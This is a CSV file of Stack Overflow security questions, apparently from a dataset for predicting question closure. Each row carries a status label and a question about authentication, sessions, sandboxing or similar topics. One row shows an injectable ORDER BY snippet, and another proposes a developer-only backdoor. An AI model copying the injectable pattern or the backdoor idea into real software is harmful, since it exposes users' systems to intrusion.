PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus,OpenStatusInt,BodyLength,TitleLength,TitleConcatWithBody,NumberOfTags
6611182,07/07/2011 13:15:46,824571,07/01/2011 09:12:33,1,0,secured user authentification within a phonegap app,"I'm developing a mobile application with PhoneGap and I'm stuck on the member login.

I want to set up a RESTful API to communicate between this mobile app and my web app. This actually doesn't cause any problem.
My problem is how to secure the user authentification and the communications between the server and the client (the mobile app).

I don't want to use HTTP Basic Authentification because both username and password are visible.
I could have used Digest Authentification but I quickly understood that it is hard to use with Ajax and is almost not so secure.

I've read lots of articles about OAuth. Is it the best solution for me? I have both consumer (mobile app) and provider access (web app) so I can do everything.

What would look like my login form? Do I need to open the login form in a ChildBrowser on the server side, get the request token then the access token, and by location change close the ChildBrowser and store the access token on the mobile phone? 

I've seen that kind of trick here http://www.wisejive.com/2010/11/phonegap-jquery-mobile-twitter-and.html ..

Please help me I really don't find the best secure solution for my RESTful API..",security,mobile,oauth,phonegap,authentification,07/08/2011 06:27:55,not constructive,1,191,7,"secured user authentification within a phonegap app I'm developing a mobile application with PhoneGap and I'm stuck on the member login.

I want to set up a RESTful API to communicate between this mobile app and my web app. This actually doesn't cause any problem.
My problem is how to secure the user authentification and the communications between the server and the client (the mobile app).

I don't want to use HTTP Basic Authentification because both username and password are visible.
I could have used Digest Authentification but I quickly understood that it is hard to use with Ajax and is almost not so secure.

I've read lots of articles about OAuth. Is it the best solution for me? I have both consumer (mobile app) and provider access (web app) so I can do everything.

What would look like my login form? Do I need to open the login form in a ChildBrowser on the server side, get the request token then the access token, and by location change close the ChildBrowser and store the access token on the mobile phone? 

I've seen that kind of trick here http://www.wisejive.com/2010/11/phonegap-jquery-mobile-twitter-and.html ..

Please help me I really don't find the best secure solution for my RESTful API..",5
8295752,11/28/2011 12:23:55,994193,10/13/2011 19:24:00,16,3,Insecure connection,"Recently, visited a webpage that displayed message ""You are visiting us on a insecure connection"" 

How and what steps to take for securing this ?

Any suggested readings will be useful.

Many thanks.. ",security,web,web-security,,,11/28/2011 23:31:33,off topic,1,32,2,"Insecure connection Recently, visited a webpage that displayed message ""You are visiting us on a insecure connection"" 

How and what steps to take for securing this ?

Any suggested readings will be useful.

Many thanks.. ",3
1802805,11/26/2009 10:16:31,79914,03/19/2009 08:06:18,18,7,Building a simple security sandbox on Windows 2008 by automatically creating & restricting user accounts?,"I want to build a fairly simple security sandbox for an application hosting service - the main goals are thus:

 1. Applications running ""in"" the sandbox cannot install anything onto the system outside of the directory the executable is running in.
 2. Access to the system in general is denied (registry access, et al.).
 3. Access to the file system (even read-only) outside the directories specified is explicitly denied. It will be a .NET application running inside the sandbox, so I am uncertain as to whether this will incidentally deny the runtime & or core dependencies?

The plan I have presently is to build the sandbox in .NET using the System.DirectoryServices namespace by:

 - creating a new semi-permanent user account for each launched instance
 - deriving it from the guest class of users to deny wide access to the system
 - then specifically granting read & write access to a finite number of directories where the application should be running.

Can anyone see any particular flaws in this plan? And is user account security sufficient to satisfy the above requirements securely? We're using a piece of commercial software right now to handle this (which is more comprehensive in it's sandboxing); but it is insufficiently automatable for our business - hence the desire to build it into our core automation software.",security,.net,user-accounts,sandbox,directoryservices,,open,0,218,15,"Building a simple security sandbox on Windows 2008 by automatically creating & restricting user accounts? I want to build a fairly simple security sandbox for an application hosting service - the main goals are thus:

 1. Applications running ""in"" the sandbox cannot install anything onto the system outside of the directory the executable is running in.
 2. Access to the system in general is denied (registry access, et al.).
 3. Access to the file system (even read-only) outside the directories specified is explicitly denied. It will be a .NET application running inside the sandbox, so I am uncertain as to whether this will incidentally deny the runtime & or core dependencies?

The plan I have presently is to build the sandbox in .NET using the System.DirectoryServices namespace by:

 - creating a new semi-permanent user account for each launched instance
 - deriving it from the guest class of users to deny wide access to the system
 - then specifically granting read & write access to a finite number of directories where the application should be running.

Can anyone see any particular flaws in this plan? And is user account security sufficient to satisfy the above requirements securely? We're using a piece of commercial software right now to handle this (which is more comprehensive in it's sandboxing); but it is insufficiently automatable for our business - hence the desire to build it into our core automation software.",5
9432172,02/24/2012 14:15:06,1132499,01/05/2012 15:32:22,71,14,Should we have backdoors in our programs?,"In my experience of programming, I've come across the concept of a programmers ""backdoor"", which I gather is to allow access into the program but not in the conventional means of access. However, I've also noticed that, in some cases, having such an access method can reduces the security of the program/script to being non-effective. 

I can envisage situations where having a backdoor is helpful (perhaps allowing access to a server to fix a critical, showstopping bug) but surely we must ensure that the backdoor can only be opened by us (the developers). Perhaps using some hashable unique elements of our computer system?

I suppose my question is, how can we ensure that we could open the backdoor?",security,cryptography,,,,02/24/2012 21:11:49,not constructive,1,117,7,"Should we have backdoors in our programs? In my experience of programming, I've come across the concept of a programmers ""backdoor"", which I gather is to allow access into the program but not in the conventional means of access. However, I've also noticed that, in some cases, having such an access method can reduces the security of the program/script to being non-effective. 

I can envisage situations where having a backdoor is helpful (perhaps allowing access to a server to fix a critical, showstopping bug) but surely we must ensure that the backdoor can only be opened by us (the developers). Perhaps using some hashable unique elements of our computer system?

I suppose my question is, how can we ensure that we could open the backdoor?",2
3963958,10/18/2010 22:33:51,149899,08/03/2009 17:34:54,248,25,HTTPS login not saving the JSESSIONID in a cookie,"We recently changed our login to use HTTPS, and we are experiencing issues with the login.

After the login, the user is redirected to an unencrypted (HTTP) page. When it reaches this page, the site checks if the user is logged in. It creates a new session and it appears that the user is not logged in, and thus our user is redirected to the login page. If the user logs in again, it will work.

The cookies are not set as https-only, but it seems like they don't work on http pages.

Does anyone know why this might be happening.",security,http,tomcat,cookies,https,,open,0,98,9,"HTTPS login not saving the JSESSIONID in a cookie We recently changed our login to use HTTPS, and we are experiencing issues with the login.

After the login, the user is redirected to an unencrypted (HTTP) page. When it reaches this page, the site checks if the user is logged in. It creates a new session and it appears that the user is not logged in, and thus our user is redirected to the login page. If the user logs in again, it will work.

The cookies are not set as https-only, but it seems like they don't work on http pages.

Does anyone know why this might be happening.",5
9921353,03/29/2012 08:02:45,958744,09/22/2011 09:23:44,33,0,Demonstration of how security through obscurity fails to work. Example transformation,"I need to demonstrate that security through obscurity fails twice in the following scenario.



I've a secret KEY.  

<p><i>User A</i> gets   <b>MessageX</b> = SecretTransformation(KEY, SecretValue1);</p>
<p><i>User B</i> gets   <b>MessageY</b> = SecretTransformation(KEY, SecretValue2);</p>

Now, Security through obscurity is in contrast with principle of open design and shannon's maxim. We also know that this security will fail as soon as an attacker manages to retrieve one of the ""secrets""

what in addition it think can be demonstrated, is that:

if an attacker manages to retrieve, **MessageX** and **MessageY** without knowing any secret he can perform some cryptanalysis attack and retrieve the **KEY** or understand the **SecretTransformation** functioning.


I hope I've explained myself i need to be pointed out to some example like the one time pad, where if you XOR with the key more then one message you can XOR back and retrieve the secret.

Thank you!",security,unsafe,demonstration,security-by-obscurity,,04/01/2012 04:02:38,off topic,1,143,11,"Demonstration of how security through obscurity fails to work. Example transformation I need to demonstrate that security through obscurity fails twice in the following scenario.



I've a secret KEY.  

<p><i>User A</i> gets   <b>MessageX</b> = SecretTransformation(KEY, SecretValue1);</p>
<p><i>User B</i> gets   <b>MessageY</b> = SecretTransformation(KEY, SecretValue2);</p>

Now, Security through obscurity is in contrast with principle of open design and shannon's maxim. We also know that this security will fail as soon as an attacker manages to retrieve one of the ""secrets""

what in addition it think can be demonstrated, is that:

if an attacker manages to retrieve, **MessageX** and **MessageY** without knowing any secret he can perform some cryptanalysis attack and retrieve the **KEY** or understand the **SecretTransformation** functioning.


I hope I've explained myself i need to be pointed out to some example like the one time pad, where if you XOR with the key more then one message you can XOR back and retrieve the secret.

Thank you!",4
4668573,01/12/2011 12:05:00,568825,01/09/2011 14:36:57,13,0,ORDER BY $order - Possible security hole?,"I have a code like this:

    ORDER BY $order

Where '$order' is taken from the url like:

http://mywebsite.com/page.php?order=Bananas DESC

Could someone with wrong intentions add their own code at the end of the URL and thus do whatever they like?",security,url,order,,,,open,0,40,7,"ORDER BY $order - Possible security hole? I have a code like this:

    ORDER BY $order

Where '$order' is taken from the url like:

http://mywebsite.com/page.php?order=Bananas DESC

Could someone with wrong intentions add their own code at the end of the URL and thus do whatever they like?",3
4007592,10/24/2010 08:50:30,313421,04/10/2010 10:36:10,427,53,"Security hole in windows server 2008, how to make money out of it ?","Playing with windows server 2008 and IIS 7 I encountered a weakness which allows running an executable on the web server. I tried my friends VPS server and it seems working on at least on web and enterprise editions. I'm not a hacker and just found it accidentally when I was testing my web application.

The question is how can I report it and make money legally and how much they would pay approximately ?",security,windows-server-2008,weaknesses,,,10/24/2010 09:27:16,off topic,1,74,14,"Security hole in windows server 2008, how to make money out of it ? Playing with windows server 2008 and IIS 7 I encountered a weakness which allows running an executable on the web server. I tried my friends VPS server and it seems working on at least on web and enterprise editions. I'm not a hacker and just found it accidentally when I was testing my web application.

The question is how can I report it and make money legally and how much they would pay approximately ?",3
1534301,10/07/2009 21:26:21,184362,10/05/2009 12:45:22,31,1,securing sessions,"I know SO isn't traditionally used this way (or maybe it is), but I've been learning about webapp security and was thinking it would be nice and encouraging to hear from SO experts what they think of this article (I'm reading it now, it's on session security). 

[http://carsonified.com/blog/dev/how-to-create-bulletproof-sessions/][1]

Maybe we can have a discussion of some kind, point out what the author misstated/forgot and what better practices are there? 

For example when it comes to a different security topic like sql injections, many people recommend things like mysql_real_escape_strings, but the experts will tell you that nothing beats prepared statements. From the comments, this article seems to have its problems, so I'm wondering how far on the good or bad side his content is. 


  [1]: http://carsonified.com/blog/dev/how-to-create-bulletproof-sessions/",security,session,csrf,,,,open,0,126,2,"securing sessions I know SO isn't traditionally used this way (or maybe it is), but I've been learning about webapp security and was thinking it would be nice and encouraging to hear from SO experts what they think of this article (I'm reading it now, it's on session security). 

[http://carsonified.com/blog/dev/how-to-create-bulletproof-sessions/][1]

Maybe we can have a discussion of some kind, point out what the author misstated/forgot and what better practices are there? 

For example when it comes to a different security topic like sql injections, many people recommend things like mysql_real_escape_strings, but the experts will tell you that nothing beats prepared statements. From the comments, this article seems to have its problems, so I'm wondering how far on the good or bad side his content is. 


  [1]: http://carsonified.com/blog/dev/how-to-create-bulletproof-sessions/",3
3312177,07/22/2010 18:35:14,373196,06/22/2010 13:09:30,195,14,Where can I start looking to better understand how computers work?,"I've been trying to figure out what computer field I want to go into later on in life. College is just around the corner for me and I've considered looking into Computer Engineering, Software Engineering, etc.

Lately, I've been looking into computer security systems and exploitations of such (purely for educational purposes, on my own property). Unfortunately, it seems to me like 99% of the people out there have no idea what they're talking about. Oftentimes, it's just ""run this"" or ""run that"" or ""you can find a program that will do all that for you"" - no one knows how these programs work or what exactly they do.

I find no fun or interest in using something that someone else created simply to call myself a ""hacker"" as most people do. In fact, I'm not even interested in hacking systems as much as HOW they do it.

My question all comes down to this.

I want to learn the ins, outs, ups, and downs of computers - everything from abstract concepts such as the internet and data transferral, to hardware. I want to know how computers store data (how the bites are organized, etc.) and what processors, etc. actually do. What is WIFI, really? Do computers communicate with light (something I picked up from a magazine that I read on a plane). 

I have multiple years of computer/programming experience, but so much of what I know about computers in general is very broad. Computers send packages of information back and forth between one another, each with a header and content. Computers are composed of multiple components, each with their own function (processor, video card, RAM, hard drive(s), etc.), which I have some basic understanding of already. etc. etc. etc.

There is just so much to a computer and I don't know where to start. I'm sure some of my college classes will clear things up for me, but I'm so curious that I want to start learning as much as I can now.

This question is probably all over the place, so please ask me to clarify when necessary. I'm a little jet lagged at the moment, but I tried to write my thoughts in the quickest, most coherent way possible (I could have completely failed in the process, though).

Thanks in advance for any advice!

Justian Meyer

> Please, feel free to edit the tags for this question. The current ones are terrible.
",security,how-stuff-works,computer-architecture,system,,,open,0,396,11,"Where can I start looking to better understand how computers work? I've been trying to figure out what computer field I want to go into later on in life. College is just around the corner for me and I've considered looking into Computer Engineering, Software Engineering, etc.

Lately, I've been looking into computer security systems and exploitations of such (purely for educational purposes, on my own property). Unfortunately, it seems to me like 99% of the people out there have no idea what they're talking about. Oftentimes, it's just ""run this"" or ""run that"" or ""you can find a program that will do all that for you"" - no one knows how these programs work or what exactly they do.

I find no fun or interest in using something that someone else created simply to call myself a ""hacker"" as most people do. In fact, I'm not even interested in hacking systems as much as HOW they do it.

My question all comes down to this.

I want to learn the ins, outs, ups, and downs of computers - everything from abstract concepts such as the internet and data transferral, to hardware. I want to know how computers store data (how the bites are organized, etc.) and what processors, etc. actually do. What is WIFI, really? Do computers communicate with light (something I picked up from a magazine that I read on a plane). 

I have multiple years of computer/programming experience, but so much of what I know about computers in general is very broad. Computers send packages of information back and forth between one another, each with a header and content. Computers are composed of multiple components, each with their own function (processor, video card, RAM, hard drive(s), etc.), which I have some basic understanding of already. etc. etc. etc.

There is just so much to a computer and I don't know where to start. I'm sure some of my college classes will clear things up for me, but I'm so curious that I want to start learning as much as I can now.

This question is probably all over the place, so please ask me to clarify when necessary. I'm a little jet lagged at the moment, but I tried to write my thoughts in the quickest, most coherent way possible (I could have completely failed in the process, though).

Thanks in advance for any advice!

Justian Meyer

> Please, feel free to edit the tags for this question. The current ones are terrible.
",4
